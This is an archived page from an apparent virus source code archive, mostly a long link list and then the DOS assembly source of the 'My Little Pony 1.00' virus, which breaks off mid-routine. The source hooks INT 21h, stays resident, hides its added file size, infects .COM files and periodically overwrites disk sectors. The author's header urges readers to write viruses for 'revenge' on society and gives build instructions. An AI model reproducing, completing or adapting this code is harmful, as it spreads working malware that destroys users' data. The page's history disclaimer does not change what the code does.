<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: cybr1307_asm</title>
<meta name="KEYWORDS" content="cybr1307.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for cybr1307.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="c0t_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c0t_asm.php">c0t_asm</a><br>
<a href="c_1701_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c_1701_asm.php">c_1701_asm</a><br>
<a href="c_1704_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c_1704_1_asm.php">c_1704_1_asm</a><br>
<a href="c_1704_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c_1704_2_asm.php">c_1704_2_asm</a><br>
<a href="c-1704_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c-1704_asm.php">c-1704_asm</a><br>
<a href="c1704_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c1704_asm.php">c1704_asm</a><br>
<a href="c-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c-3_asm.php">c-3_asm</a><br>
<a href="c-3-mut_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c-3-mut_asm.php">c-3-mut_asm</a><br>
<a href="cacodmon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cacodmon_asm.php">cacodmon_asm</a><br>
<a href="c_a_d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/c_a_d_asm.php">c_a_d_asm</a><br>
<a href="caffein_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/caffein_asm.php">caffein_asm</a><br>
<a href="canadian_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/canadian_asm.php">canadian_asm</a><br>
<a href="canbis2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/canbis2__asm.php">canbis2__asm</a><br>
<a href="canbis4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/canbis4_asm.php">canbis4_asm</a><br>
<a href="cancer___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cancer___asm.php">cancer___asm</a><br>
<a href="cancer__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cancer__asm.php">cancer__asm</a><br>
<a href="cancer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cancer_asm.php">cancer_asm</a><br>
<a href="cannab1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab1_asm.php">cannab1_asm</a><br>
<a href="cannab2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab2__asm.php">cannab2__asm</a><br>
<a href="cannab2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab2_asm.php">cannab2_asm</a><br>
<a href="cannab3__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab3__asm.php">cannab3__asm</a><br>
<a href="cannab3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab3_asm.php">cannab3_asm</a><br>
<a href="cannab_4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab_4_asm.php">cannab_4_asm</a><br>
<a href="cannab4__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab4__asm.php">cannab4__asm</a><br>
<a href="cannab4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cannab4_asm.php">cannab4_asm</a><br>
<a href="carbunc__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/carbunc__asm.php">carbunc__asm</a><br>
<a href="carbunc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/carbunc_asm.php">carbunc_asm</a><br>
<a href="caroevil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/caroevil_asm.php">caroevil_asm</a><br>
<a href="carpdiem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/carpdiem_asm.php">carpdiem_asm</a><br>
<a href="cascade_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cascade_asm.php">cascade_asm</a><br>
<a href="casino_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/casino_asm.php">casino_asm</a><br>
<a href="catch22_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/catch22_asm.php">catch22_asm</a><br>
<a href="catfod_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/catfod_pas.php">catfod_pas</a><br>
<a href="catphis__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/catphis__asm.php">catphis__asm</a><br>
<a href="catphish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/catphish_asm.php">catphish_asm</a><br>
<a href="caza_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/caza_asm.php">caza_asm</a><br>
<a href="cclust2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cclust2_asm.php">cclust2_asm</a><br>
<a href="cdeath1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdeath1_asm.php">cdeath1_asm</a><br>
<a href="cdeath3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdeath3_asm.php">cdeath3_asm</a><br>
<a href="cdeath4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdeath4_asm.php">cdeath4_asm</a><br>
<a href="cdeath5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdeath5_asm.php">cdeath5_asm</a><br>
<a href="cdeath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdeath_asm.php">cdeath_asm</a><br>
<a href="cdset4___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset4___asm.php">cdset4___asm</a><br>
<a href="cdset4__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset4__asm.php">cdset4__asm</a><br>
<a href="cdset4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset4_asm.php">cdset4_asm</a><br>
<a href="cdset5___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset5___asm.php">cdset5___asm</a><br>
<a href="cdset5__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset5__asm.php">cdset5__asm</a><br>
<a href="cdset5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset5_asm.php">cdset5_asm</a><br>
<a href="cdset6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset6_asm.php">cdset6_asm</a><br>
<a href="cdset_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cdset_asm.php">cdset_asm</a><br>
<a href="cemetary_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cemetary_asm.php">cemetary_asm</a><br>
<a href="chad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/chad_asm.php">chad_asm</a><br>
<a href="change_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/change_asm.php">change_asm</a><br>
<a href="cheeba_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cheeba_asm.php">cheeba_asm</a><br>
<a href="cheesy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cheesy_asm.php">cheesy_asm</a><br>
<a href="cheezy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cheezy_asm.php">cheezy_asm</a><br>
<a href="chicago_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/chicago_asm.php">chicago_asm</a><br>
<a href="choinka_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/choinka_asm.php">choinka_asm</a><br>
<a href="cia2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cia2_asm.php">cia2_asm</a><br>
<a href="cia___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cia___asm.php">cia___asm</a><br>
<a href="cia__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cia__asm.php">cia__asm</a><br>
<a href="cia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cia_asm.php">cia_asm</a><br>
<a href="ci_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/ci_asm.php">ci_asm</a><br>
<a href="civil210_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil210_asm.php">civil210_asm</a><br>
<a href="civil211_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil211_asm.php">civil211_asm</a><br>
<a href="civil_2b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil_2b_asm.php">civil_2b_asm</a><br>
<a href="civil310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil310_asm.php">civil310_asm</a><br>
<a href="civil411_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil411_asm.php">civil411_asm</a><br>
<a href="civil412_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil412_asm.php">civil412_asm</a><br>
<a href="civil510_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil510_asm.php">civil510_asm</a><br>
<a href="civil5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil5_asm.php">civil5_asm</a><br>
<a href="civil_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civil_ii_asm.php">civil_ii_asm</a><br>
<a href="civilsrv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/civilsrv_asm.php">civilsrv_asm</a><br>
<a href="clonewa__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/clonewa__asm.php">clonewa__asm</a><br>
<a href="clonewar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/clonewar_asm.php">clonewar_asm</a><br>
<a href="clonwar2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/clonwar2_asm.php">clonwar2_asm</a><br>
<a href="clust__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/clust__asm.php">clust__asm</a><br>
<a href="clust_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/clust_asm.php">clust_asm</a><br>
<a href="cluster_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cluster_asm.php">cluster_asm</a><br>
<a href="cocaine_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cocaine_asm.php">cocaine_asm</a><br>
<a href="codezer__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/codezer__asm.php">codezer__asm</a><br>
<a href="codezero_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/codezero_asm.php">codezero_asm</a><br>
<a href="coffshp1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/coffshp1_asm.php">coffshp1_asm</a><br>
<a href="coffshp3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/coffshp3_asm.php">coffshp3_asm</a><br>
<a href="coke_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/coke_asm.php">coke_asm</a><br>
<a href="com_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/com_asm.php">com_asm</a><br>
<a href="comdex7_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/comdex7_asm.php">comdex7_asm</a><br>
<a href="comment1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/comment1_asm.php">comment1_asm</a><br>
<a href="comment2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/comment2_asm.php">comment2_asm</a><br>
<a href="compa100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/compa100_asm.php">compa100_asm</a><br>
<a href="compan88_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/compan88_asm.php">compan88_asm</a><br>
<a href="compan92_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/compan92_asm.php">compan92_asm</a><br>
<a href="compan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/compan_asm.php">compan_asm</a><br>
<a href="compiler_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/compiler_asm.php">compiler_asm</a><br>
<a href="compres_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/compres_asm.php">compres_asm</a><br>
<a href="comshel2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/comshel2_asm.php">comshel2_asm</a><br>
<a href="comshell_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/comshell_asm.php">comshell_asm</a><br>
<a href="comvirus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/comvirus_asm.php">comvirus_asm</a><br>
<a href="conj-270_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/conj-270_asm.php">conj-270_asm</a><br>
<a href="conj-300_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/conj-300_asm.php">conj-300_asm</a><br>
<a href="conj-ajx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/conj-ajx_asm.php">conj-ajx_asm</a><br>
<a href="conj-ala_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/conj-ala_asm.php">conj-ala_asm</a><br>
<a href="conjurer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/conjurer_asm.php">conjurer_asm</a><br>
<a href="cookie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cookie_asm.php">cookie_asm</a><br>
<a href="cookie_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cookie_c.php">cookie_c</a><br>
<a href="copcom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/copcom_asm.php">copcom_asm</a><br>
<a href="copyr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/copyr_asm.php">copyr_asm</a><br>
<a href="cpi2_5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cpi2_5_asm.php">cpi2_5_asm</a><br>
<a href="cpxk_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cpxk_asm.php">cpxk_asm</a><br>
<a href="cpyr1193_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cpyr1193_asm.php">cpyr1193_asm</a><br>
<a href="crazy_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crazy_c.php">crazy_c</a><br>
<a href="crdeath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crdeath_asm.php">crdeath_asm</a><br>
<a href="creepdth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/creepdth_asm.php">creepdth_asm</a><br>
<a href="creeper_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/creeper_asm.php">creeper_asm</a><br>
<a href="creeperb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/creeperb_asm.php">creeperb_asm</a><br>
<a href="crepdeth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crepdeth_asm.php">crepdeth_asm</a><br>
<a href="crf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crf_asm.php">crf_asm</a><br>
<a href="crf_mdm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crf_mdm_asm.php">crf_mdm_asm</a><br>
<a href="crf-mdm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crf-mdm_asm.php">crf-mdm_asm</a><br>
<a href="crumble__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crumble__asm.php">crumble__asm</a><br>
<a href="crumble_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/crumble_asm.php">crumble_asm</a><br>
<a href="csl_beta_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/csl_beta_asm.php">csl_beta_asm</a><br>
<a href="curse_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/curse_asm.php">curse_asm</a><br>
<a href="cursev12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cursev12_asm.php">cursev12_asm</a><br>
<a href="cv4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cv4_asm.php">cv4_asm</a><br>
<a href="cv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cv_asm.php">cv_asm</a><br>
<a href="cvirus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cvirus_asm.php">cvirus_asm</a><br>
<a href="cvirus_v19_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cvirus_v19_c.php">cvirus_v19_c</a><br>
<a href="cvirus_v20_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cvirus_v20_c.php">cvirus_v20_c</a><br>
<a href="cvirus_v21_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cvirus_v21_c.php">cvirus_v21_c</a><br>
<a href="cvirus_v30_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cvirus_v30_c.php">cvirus_v30_c</a><br>
<a href="cw_navig_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cw_navig_asm.php">cw_navig_asm</a><br>
<a href="cw-navig_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cw-navig_asm.php">cw-navig_asm</a><br>
<a href="cybertch_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cybertch_asm.php">cybertch_asm</a><br>
<a href="cybr1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cybr1307_asm.php">cybr1307_asm</a><br>
<a href="cybrcide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cybrcide_asm.php">cybrcide_asm</a><br>
<a href="cybrtcha_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cybrtcha_asm.php">cybrtcha_asm</a><br>
<a href="cybrtchb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cybrtchb_asm.php">cybrtchb_asm</a><br>
<a href="cybtch_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/cybtch_b_asm.php">cybtch_b_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

                .model tiny
                .code

                org     100h

start:

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=;
;                    A NEW ORDER OF INTELLIGENCE PRESENTS:                     ;
;                             My Little Pony 1.00                              ;
;           Copyright (c) 1992, 1993 by Cruel Entity / Macaroni Ted            ;
;                                 - A.N.O.I -                                  ;
;                                                                              ;
;                                                                              ;
; I know that there is a much better documented source-code for this	       ;
; virus. And I'm also very interessted to get in touch with the guy	       ;
; who did that documentation. Please contact me.                               ;
;                                                                              ;
; You may freely use this code as you want, just give me some of the	       ;
; credits. Please learn to create virus, so we, together can get our	       ;
; revenge to the soceity. Learn to feel the feeling being cruel!               ;
;                                                                              ;
; Of cource I can't take any responsibility for all virus-coders	       ;
; who use any of the routines in this virus.                                   ;
;                                                                              ;
;                                                                              ;
; Greetings to;  The Unforgiven for giving me AT&T's                           ;
;                Immortal Riot's members '94                                   ;
;                The man sitting in basement                                   ;
;                                                                              ;
; ps! Tasm /m3 and tlink /t to get this babe into executable!
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=;

start:
                call    $+3
sub_this:       pop     bp

                mov     ax,0dd22h                ;are we already in memory?
                int     21h
                cmp     ax,03d33h
                jne     $+7
                lea     dx,[bp+(cancel-sub_this)]
                jmp     far ptr dx

                mov     ax,3521h                ;get int 21h vect
                int     21h
                mov     [bp+(int_21h_off-sub_this)],bx
                mov     [bp+(int_21h_seg-sub_this)],es

                mov     ax,cs
                dec     ax
                mov     es,ax
                mov     ax,es:[0003h]
                sub     ax,[bp+(memlen-sub_this)]
                mov     es:[0003h],ax
                mov     ax,[bp+(memlen-sub_this)]
                sub     word ptr es:[0012h],ax
                mov     es,es:[0012h]
                push    es

                lea     si,[bp+(start-sub_this)]
                mov     di,0100h
                mov     cx,[bp+(filelen-sub_this)]
                rep     movsb

                pop     ds                      ;es => ds
                mov     ax,2521h                ;new vector at ES:0100
                lea     dx,new_int_21h
                int     21h
cancel:
                push    cs                      ;cs => ds => es
                push    cs
                pop     ds
                pop     es

                lea     si,[bp+(first_bytes-sub_this)]
                mov     cx,3
                mov     di,100h
                rep     movsb
                sub     di,3
                jmp     far ptr di

                db      'Simple Simon met a pieman going to the fair said'
                db      ' Simple Simon to the pieman let me take your ware'
write_rnd_sector:
                cmp     dh,0            ;sec
                jne     back

                cmp     dl,5            ;100th
                ja      back


                pushf                   ;fuck rnd sector
                push    bx

                call    get_rnd
                mov     cx,10           ;/ 10
                xor     dx,dx
                div     cx
                mov     dx,ax           ;dx=ax

                mov     al,2h           ; Drive #, start with C:
                mov     cx,1h           ; # of sectors to overwrite
                lea     bx,logo         ; Address to overwriting DATA
loopie:
                int     26h
                popf
                inc     al
                cmp     al,25
                jne     loopie


                pop     bx
                popf
                jmp     back

                db      '(c)1993 Cruel Entity'

;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
;                                 New int 21h
;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
new_int_21h:
                pushf

                cmp     ax,0dd22h       ;check if resident
                je      mem_check

                cmp     ah,11h          ;find 1st old
                je      find_old
                cmp     ah,12h          ;find 1st old
                je      find_old

                cmp     ah,4eh                  ;dos 2.x
                je      find_
                cmp     ah,4fh
                je      find_

                cmp     ah,3dh          ;open
                je      open_

                cmp     ah,3eh          ;close
                je      close_

                cmp     ah,2ch
                je      back2

                push    ax
                push    cx
                push    dx

                mov     ah,2ch
                int     21h

                cmp     cl,00                   ;a new hour?
                je      write_rnd_sector
back:
                pop     dx
                pop     cx
                pop     ax

back2:
                cmp     ah,36h
                jne     return_21h
                push    bp
                lea     bp,get_free_space
                jmp     far ptr bp
return_21h:
                popf

real_int_21h:   db      0eah            ;jmp...
int_21h_off     dw      ?               ;to old int 21h
int_21h_seg     dw      ?
;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


find_:
                push    bp
                lea     bp,find_new
                jmp     far ptr bp

open_:
                push    bp
                lea     bp,open
                jmp     far ptr bp
close_:
                push    bp
                lea     bp,close_file
                jmp     far ptr bp

mem_check:
                popf
                mov     ax,3d33h
                iret
call_int21h:
                jmp     dword ptr cs:int_21h_off   ;force a call to DOS
                ret

find_old:
                popf

                pushf                           ;find fcb
                push    cs
                call    call_int21h
                cmp     al,0ffh
                je      no_more_files

                pushf
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                push    bp

                mov     ah,2fh                  ;get dta
                int     21h

                push    es              ;es:bx
                pop     ds              ;ds:bx
                mov     si,bx           ;ds:si

                add     si,16           ;ext name
                lodsw
                cmp     ax,'OC'         ;.CO
                jne     cancel_ff
                lodsb
                cmp     al,'M'          ;M
                jne     cancel_ff
ext_ok:
                                         ;ext=com
                mov     si,bx            ;check size
                add     si,26h
                lodsw
                cmp     ax,0            ;=> 0ffffh?
                jne     cancel_ff

                mov     si,bx           ;check if already infected
                add     si,30
                lodsw                   ;time
                and     al,00011111b
                cmp     al,00001010b
                je      $+7            ;already infected (sec=24)
                lea     dx,store_in_mem
                jmp     far ptr dx

                mov     si,bx           ;alter size
                add     si,36
                mov     di,si
                lodsw
                sub     ax,cs:filelen
                jz      cancel_ff
                stosw
cancel_ff:
                pop     bp
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf
no_more_files:  retf    2               ;iret flags

           db      "%%% MY LITTLE PONY %%% COPYRIGHT(C) 1993 A.N.O.I. %%%"

store_in_mem:                           ;store filename in buffer
                mov     si,bx
                add     si,8

                push    cs              ;cs => es
                pop     es

                mov     cx,10
                lea     di,file_buffer  ;check pos
check_pos:
                cmp     byte ptr es:[di],20h
                je      store
                add     di,8
                loop    check_pos
                jmp     cancel_ff

store:
                mov     cx,8
                rep     movsb
                jmp     cancel_ff
;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

get_free_space:
                pop     bp
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                push    bp

                push    cs              ;cs=> ds=> es
                push    cs
                pop     ds
                pop     es

                lea     di,file_buffer
                mov     cx,10
check_last:
                cmp     byte ptr [di],20h       ;check if last
                je      cancel_inf

                push    di
                push    cx
                mov     si,di           ;si=file pos
                call    infect
                pop     cx
                pop     di

                add     di,8
                loop    check_last
cancel_inf:
                push    cs
                pop     es
                lea     di,file_buffer
                mov     cx,80+12
                mov     al,20h
                rep     stosb

                pop     bp
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf
                jmp     real_int_21h

infect:
                                        ;convert filename to asciiz
                lea     di,filename
                mov     cx,8            ;filename NOT ext
cpy_filename:
                lodsb
                cmp     al,20h
                je      filename_klar
                stosb
                loop    cpy_filename
filename_klar:
                mov     al,'.'
                stosb
                mov     al,'C'
                stosb
                mov     al,'O'
                stosb
                mov     al,'M'
                stosb
                mov     al,0
                stosb

                push    cs
                pop     ds

                mov     ax,4300h        ;get attrib
                lea     dx,filename
                int     21h
                jnc     $+3             ;error?
                ret

                push    cx              ;save attrib

                xor     cx,cx
                mov     ax,4301h        ;force all attribs
                int     21h

                mov     ax,3d02h        ;open filename
                lea     dx,filename
                pushf
                push    cs
                call    call_int21h
                mov     bx,ax           ;save handle

                mov     ax,5700h        ;get time/date
                int     21h

                push    dx              ;save time/date
                push    cx

                and     cl,00011111b
                cmp     cl,00001010b
                jne     $+7            ;already infected (sec=24)
                lea     dx,cancel_inf2
                jmp     far ptr dx



                mov     ah,3fh                  ;read 3 first bytes
                mov     cx,3
                lea     dx,first_bytes
                int     21h

                mov     ax,4202h                ;goto eof
                xor     dx,dx
                xor     cx,cx
